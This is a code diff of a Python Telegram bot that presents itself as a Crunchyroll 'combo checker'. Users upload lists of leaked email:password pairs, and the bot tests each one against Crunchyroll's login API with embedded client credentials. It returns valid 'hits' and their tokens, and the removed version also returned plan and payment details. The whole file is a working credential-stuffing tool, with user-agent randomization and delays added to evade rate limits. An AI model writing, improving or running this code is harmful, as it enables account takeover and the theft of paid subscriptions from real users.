@@ -1,183 +1,159 @@
 import os
+import json
 import asyncio
 import requests
-import time
-from uuid import uuid1
-from telegram import Update
+from uuid import uuid4
+from user_agent import generate_user_agent
+from telegram import Update, Document
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
-# Colors for console
-G = '\033[2;32m'
-R = '\033[1;31m'
-O = '\x1b[38;5;208m'
-
-TOKEN = os.getenv("BOT_TOKEN")
-if not TOKEN:
-    raise ValueError("BOT_TOKEN environment variable not set!")
-
-# ====================== YOUR CHECKER FUNCTION ======================
-def login(email: str, pasw: str):
+# Crunchyroll Checker Function
+def crunchyroll_check(username: str, password: str):
+    url = "https://beta-api.crunchyroll.com/auth/v1/token"
+    
     headers = {
-        "ETP-Anonymous-ID": str(uuid1()),
-        "Request-Type": "SignIn",
-        "Accept": "application/json",
-        "Accept-Charset": "UTF-8",
-        "User-Agent": "Ktor client",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Host": "beta-api.crunchyroll.com",
-        "Connection": "Keep-Alive",
-        "Accept-Encoding": "gzip"
+        "host": "beta-api.crunchyroll.com",
+        "content-type": "application/x-www-form-urlencoded",
+        "accept-encoding": "gzip",
+        "user-agent": generate_user_agent()
     }
+    
     data = {
         "grant_type": "password",
-        "username": email,
-        "password": pasw,
+        "username": username,
+        "password": password,
         "scope": "offline_access",
-        "client_id": "yhukoj8on9w2pcpgjkn_",
-        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
-        "device_type": "FIRETV",
-        "device_id": str(uuid1()),
-        "device_name": "kara"
+        "client_id": "y2arvjb0h0rgvtizlovy",
+        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
+        "device_type": "Redmi",
+        "device_id": str(uuid4()),
+        "device_name": "Redmi note 8 pro"
     }
-
+    
     try:
-        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token",
-                            data=data, headers=headers, timeout=15)
-        res.raise_for_status()
-        text = res.text
+        response = requests.post(url, headers=headers, data=data, timeout=25)
+        text = response.text
 
-        if "access_token" not in text:
-            return f"{R}[BAD] {email}:{pasw}"
+        if response.status_code in (400, 401, 403):
+            return "❌ Invalid credentials"
 
-        token = text.split('access_token":"')[1].split('"')[0]
+        if "invalid_grant" in text or "invalid_credentials" in text:
+            return "❌ Wrong email or password"
 
-        headers_get = {
-            "Authorization": f"Bearer {token}",
-            "Accept": "application/json",
-            "User-Agent": "Ktor client",
-            "Host": "beta-api.crunchyroll.com",
-            "Connection": "Keep-Alive"
-        }
+        if "too_many_requests" in text:
+            return "⏳ Rate limited. Try later"
 
-        res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
-                               headers=headers_get, timeout=10)
+        if response.status_code == 200 and "access_token" in text:
+            result = response.json()
+            token = result.get("access_token", "")[:60]
+            return f"✅ **HIT**\nEmail: `{username}`\nToken: `{token}...`"
 
-        if "external_id" not in res_get.text:
-            return f"{R}[BAD] {email}:{pasw}"
-
-        external_id = res_get.text.split('external_id":"')[1].split('"')[0]
-
-        res_info = requests.get(
-            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/third_party_products",
-            headers=headers_get, timeout=10
-        )
-
-        text_info = res_info.text.lower()
-        if any(x in text_info for x in ["fan", "premium", "no_ads", 'is_subscribable":false']):
-            try:
-                typ = res_info.text.split('"type":"')[1].split('"')[0]
-                free_t = res_info.text.split('"active_free_trial":')[1].split(",")[0]
-                payment = res_info.text.split('"source":"')[1].split('"')[0]
-                expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]
-
-                msg = f"""
-🔥 **HIT** 🔥
-**Email:** `{email}`
-**Pass:** `{pasw}`
-**Plan:** {typ}
-**Free Trial:** {free_t}
-**Payment:** {payment}
-**Expiry:** {expiry}
-"""
-                return msg
-            except:
-                return f"{G}[HIT] {email}:{pasw}"
-        else:
-            return f"{O}[CUSTOM] {email}:{pasw}"
+        return "❓ Unknown error"
 
     except Exception as e:
-        if "406 Not Acceptable" in str(e):
-            return "Rate limited — waiting..."
-        return f"{R}[BAD] {email}:{pasw}"
+        return f"⚠️ Error: {str(e)[:100]}"
 
-# ====================== BOT HANDLERS ======================
+
+# Telegram Bot
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👋 **Crunchyroll Checker Bot**\n\n"
-        "Send me a `.txt` combo file (email:password)\n"
-        "I will check it and send results live."
+        "🎉 **Crunchyroll Combo Checker Bot**\n\n"
+        "Send a message with: `email:password`\n"
+        "Or upload a **.txt** combo list (one combo per line)\n\n"
+        "Example combo line:\n"
+        "`user@example.com:password123`",
+        parse_mode=ParseMode.MARKDOWN
     )
 
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    message = await update.message.reply_text("📥 Downloading file...")
 
-    file = await update.message.document.get_file()
-    combo_path = "combo.txt"
-    await file.download_to_drive(combo_path)
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip() if update.message.text else ""
 
-    await message.edit_text("🔍 Checking accounts... (this can take a while)")
-
-    with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
-        lines = [line.strip() for line in f if ":" in line]
-
-    hits = 0
-    customs = 0
-    bads = 0
-
-    for i, line in enumerate(lines, 1):
+    if ":" in text and "@" in text:
         try:
-            email, pasw = line.split(":", 1)
-            result = login(email.strip(), pasw.strip())
-
-            if "HIT" in result:
-                hits += 1
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text=result,
-                    parse_mode=ParseMode.MARKDOWN
-                )
-            elif "CUSTOM" in result:
-                customs += 1
-            else:
-                bads += 1
-
-            # Progress update every 10 checks
-            if i % 10 == 0 or i == len(lines):
-                await message.edit_text(
-                    f"📊 Progress: {i}/{len(lines)}\n"
-                    f"✅ Hits: {hits} | 🟡 Customs: {customs} | ❌ Bads: {bads}"
-                )
-
-            time.sleep(1.2)  # avoid rate limit
-
+            email, password = [x.strip() for x in text.split(":", 1)]
+            await update.message.reply_text(f"🔍 Checking: `{email}`", parse_mode=ParseMode.MARKDOWN)
+            
+            result = crunchyroll_check(email, password)
+            await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
         except:
-            continue
+            await update.message.reply_text("❌ Wrong format! Use `email:password`")
+    else:
+        await update.message.reply_text("Send `email:password` or upload a .txt file")
 
-    # Final summary
-    summary = f"""
-✅ **Check Finished!**
 
-**Total lines:** {len(lines)}
-**Hits:** {hits}
-**Customs:** {customs}
-**Bads:** {bads}
-"""
-    await message.edit_text(summary)
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    document = update.message.document
+    
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please upload only **.txt** files")
+        return
 
-    # Cleanup
-    if os.path.exists(combo_path):
-        os.remove(combo_path)
+    await update.message.reply_text("📂 File received. Processing combo list...")
 
-# ====================== MAIN (RAILWAY-FRIENDLY) ======================
+    try:
+        file = await context.bot.get_file(document.file_id)
+        file_bytes = await file.download_as_bytearray()
+        content = file_bytes.decode('utf-8', errors='ignore')
+
+        combos = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]
+
+        if not combos:
+            await update.message.reply_text("❌ No valid combos found in the file.")
+            return
+
+        await update.message.reply_text(f"✅ Found {len(combos)} combos. Starting check...\nIt may take some time.")
+
+        hits = []
+        for i, combo in enumerate(combos, 1):
+            if ":" not in combo:
+                continue
+            email, password = [x.strip() for x in combo.split(":", 1)]
+            
+            await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}", parse_mode=ParseMode.MARKDOWN)
+            
+            result = crunchyroll_check(email, password)
+            
+            if "HIT" in result:
+                hits.append(combo)
+                await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
+            
+            # Small delay to avoid rate limits
+            await asyncio.sleep(1.5)
+
+        # Final summary
+        if hits:
+            hit_text = "\n".join(hits)
+            await update.message.reply_text(
+                f"🎯 **CHECK COMPLETE**\n\n"
+                f"Total: {len(combos)}\n"
+                f"Hits: {len(hits)}\n\n"
+                f"**Hits:**\n{hit_text}",
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            await update.message.reply_text("✅ Check finished.\nNo hits found.")
+
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error processing file: {str(e)[:200]}")
+
+
 def main():
+    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+    if not TOKEN:
+        print("❌ TELEGRAM_BOT_TOKEN not found!")
+        return
+
     app = Application.builder().token(TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
-    print("🤖 Crunchyroll Bot is now running on Railway...")
-    app.run_polling()   # ← This is the important change (sync method)
+    print("🚀 Crunchyroll Checker Bot is running...")
+    app.run_polling()
+
 
 if __name__ == "__main__":
     main()
